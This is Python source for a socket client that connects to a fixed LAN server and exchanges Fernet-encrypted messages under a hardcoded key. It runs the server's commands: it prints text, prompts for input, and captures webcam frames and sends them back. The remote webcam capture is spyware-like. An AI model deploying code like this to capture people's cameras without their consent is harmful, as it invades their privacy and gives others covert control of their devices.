import socket
import threading
import time
from cryptography.fernet import Fernet
import cv2
import pickle

splitter = "~~~~~~".encode("utf-8")

class main:
	def hear(self):
		while True:
			data = self.c.recv(2048)
			if not data:
				break
			for d in data.split(splitter):
				d = d.replace(splitter, b"")
				if len(d) > 1:
					self.messages.append(d)

	def sendmsg(self, msg):
		#print("Send: {}".format(msg))
		bytess = str(msg).encode("utf-8")
		self.sendbytes(bytess)

	def sendbytes(self, bytess):
		m = self.fernet.encrypt(bytess)  + b"~~~~~~"
		#print("Sending: {}".format(m))
		self.c.sendall(m)

	def getmessage(self):
		try:
			while True:
				if len(self.messages) > 0:
					dat = self.messages[0]
					del self.messages[0]
					return dat
				time.sleep(0.01)
		except:
			return " "

	def recv(self):
		dat = self.getmessage()
		try:
			dat = self.fernet.decrypt(dat).decode("utf-8")
		except:
			return ""
		#print("Recv: {}".format(dat))
		return str(dat)

	def testDevice(self, source):
		cap = cv2.VideoCapture(source) 
		if cap is None or not cap.isOpened():
			return False
		else:
			return cap

	def inputcamera(self, m):
		if self.webcam:
			try:
				ret, data = self.webcam.read()
			except:
				ret = False

			if ret:
				self.sendbytes(pickle.dumps(data))
			else:
				self.sendmsg("%%%NOCAMERA%%%")
		else:
			self.sendmsg("%%%NOCAMERA%%%")

	def check(self, m):
		dat = self.recv()

		secure = False

		#print(dat)

		if dat == "%%%PRINT%%%SERVER IS GOING TO SEND A INPUT COMMAND":

			dat = self.recv()

			#print(dat)

			if dat == "%%%INPUT%%%%%%SERVER_REPLY%%%":
				self.sendmsg("%%%CORRECT_REPLY%%%")
				secure = True
			else:
				self.sendmsg("%%%INCORRECT_REPLY%%%")
		if not secure:
			self.sendmsg("%%%INCORRECT_REPLY%%%")
			print("Error while checking secure connection.")

		return secure


	def connect(self):
		self.c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		host = "192.168.1.92"
		port = 7777

		self.c.connect((host, port))

	def input(self, message):
		self.sendmsg(input(message))

	def get_camera(self):
		self.functional_webcams = []
		for i in range(10):
			webcam = self.testDevice(i-1)
			if webcam:
				self.functional_webcams.append(webcam)
				self.webcam = webcam
				#print("camera", i-1)
				#rec, img = self.webcam.read()
				#cv2.imshow("pa", img)
				#cv2.waitKey(0)
				return ""

	def __init__(self):
		self.connect()

		self.ht = threading.Thread(target=self.hear)
		self.ht.start()

		self.messages = []

		self.get_camera()

		self.key = "VlD8h2tEiJkQpKKnDNKnu8ya2fpIBMOo5oc7JKNasvk="

		try:
			self.fernet = Fernet(self.key)
		except:
			print("Error setting fernet key")
			input()

		self.commands = [
		[self.check, "%%%PRINT%%%SERVER IS GOING TO DO A TEST"],
		[self.inputcamera, "%%%INPUTCAMERA%%%"],
		[print, "%%%PRINT%%%"],
		[self.input, "%%%INPUT%%%"]
		]


		while True:
			dat = self.recv()

			for d in self.commands:
				#print("{} in {}".format(d[1], dat))
				if d[1] in dat:
					dat = dat.replace(d[1], "")
					d[0](dat)

client = main()